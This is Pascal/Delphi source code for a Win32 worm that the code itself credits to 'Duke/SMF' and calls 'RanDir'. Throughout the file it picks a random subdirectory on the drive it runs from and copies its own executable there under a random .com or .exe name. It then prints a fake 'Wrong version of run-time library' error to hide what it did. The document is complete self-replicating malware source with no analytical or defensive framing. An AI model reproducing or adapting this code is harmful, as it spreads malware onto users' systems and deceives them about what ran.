   program randir32;
   uses SysUtils, Classes;
   var doserror:integer;
       NewName,P:string;
       Y:boolean;
   {---------------------------------------------------------------------------}
   procedure CopyFile(const FileName, DestiNation{me}: TFileName);
   var
     CopyBuffer: Pointer; { buffer for copying }
     BytesCopied: Longint;
     Source, Dest: Integer; { handles }
   const
     ChunkSize: Longint = 8192; { copy in 8K chunks }
   begin
       GetMem(CopyBuffer, ChunkSize); { allocate the buffer }
       try
       Source := FileOpen(FileName, fmShareDenyWrite); { open source file }
       try
         Dest := FileCreate(Destination); { create output file; overwrite existing }
         try
           repeat
             BytesCopied := FileRead(Source, CopyBuffer^, ChunkSize); { read chunk }
             if BytesCopied > 0 then { if we read anything... }
               FileWrite(Dest, CopyBuffer^, BytesCopied); { ...write chunk }
           until BytesCopied < ChunkSize; { until we run out of chunks }
         finally
           FileClose(Dest); { close the destination file }
         end;
       finally
         FileClose(Source); { close the source file }
       end;
     finally
       FreeMem(CopyBuffer, ChunkSize); { free the buffer }
     end;
   end;
   {---------------------------------------------------------------------------}
   procedure MakeWorm;
   var  i,d:byte;
   begin
   NewName:='[Win32.HLLW.RanDir (c) by Duke/SMF]';
   NewName:='Thnx to Lam@r';
   NewName:='';
   d:=random(8)+1;
   for i:=1 to d do NewName:=NewName+chr(random(26)+97);
   d:=random(255);
   if d div 2 = d/2 then NewName:=NewName+'.com' else NewName:=NewName+'.exe';
   NewName:=P+'\'+NewName;
   CopyFile(paramstr(0),NewName);
   end;
   {---------------------------------------------------------------------------}
   function ScanTree(Dir:string):integer;
   var N:Tsearchrec;
       D:integer;
   begin
   D:=0;
   Dir:=Dir+'\';
   doserror:=findfirst(Dir+'*.*',$3F,N);
   while doserror=0 do
     begin
     with N do if ((Attr and 16)<>0) and (Name[1]<>'.') then D:=D+1;
     doserror:=findnext(N);
     end;
   ScanTree:=D;
   end;
   {---------------------------------------------------------------------------}
   procedure FindDir(var Dir:string;D:integer);
   var N:Tsearchrec;
       K:integer;
   begin
   if D=0 then Y:=true else
     begin
     K:=0;
     Dir:=Dir+'\';
     doserror:=findfirst(Dir+'*.*',$3F,N);
     while doserror=0 do
       begin
       with N do if ((Attr and 16)<>0) and (Name[1]<>'.') then K:=K+1;
       if K=D then
          begin
          P:=P+N.name;
          exit;
          end;
       doserror:=findnext(N);
       end;
     end;
   end;
   {---------------------------------------------------------------------------}
   begin
   {$APPTYPE CONSOLE}
   Randomize;
   P:=copy(paramstr(0),1,2);
   Y:=false;
   while Y=false do FindDir(P,random(ScanTree(P)));
   MakeWorm;
   writeln('Wrong version of run-time library.');
   end.
